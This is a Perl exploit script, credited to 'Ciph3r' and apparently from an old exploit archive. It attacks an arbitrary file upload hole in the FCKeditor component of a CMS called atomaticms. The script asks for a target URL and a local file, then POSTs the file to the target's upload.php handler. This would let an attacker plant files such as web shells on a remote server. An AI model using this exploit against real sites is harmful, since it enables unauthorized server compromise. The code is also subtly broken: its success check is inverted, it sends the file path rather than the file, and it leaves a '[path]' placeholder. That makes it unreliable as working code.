#!/usr/bin/perl
#
# bug Discovered by : Ciph3r
#
# MAIL : Ciph3r_blackhat@yahoo.com
#
# SP tanx4: Iranian hacker & Kurdish security TEAM
#
# sp TANX2: milw0rm.com & google.com & sourceforge.net
#
# CMS download : http://sourceforge.net/project/showfiles.php?group_id=187120
#
# CLASS : remote Upload
#
# risk : high
#

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+         atomaticms10_all[1] (fckeditor) Arbitrary File Upload +
+                                                               +
+         Discovered && Coded By: Ciph3r                        +
+         SP tanx4: Iranian hacker & Kurdish security TEAM      +
+         CLASS : remote Upload                                 +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

INTRO

print "Enter URL(ie: http://site.com): ";
    chomp(my $url=<STDIN>);

print "Enter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);

my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/[path]/FCKeditor/editor/filemanager/upload/php/upload.php',
                      Content_Type => 'form-data',
                      Content      => [ NewFile => $file ] );

if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "Exploit Successfull! File Uploaded!\n"; }
    else { print "File Upload Is Disabled! Failed!\n"; }
} else { print "HTTP Request Failed!\n"; }

exit;
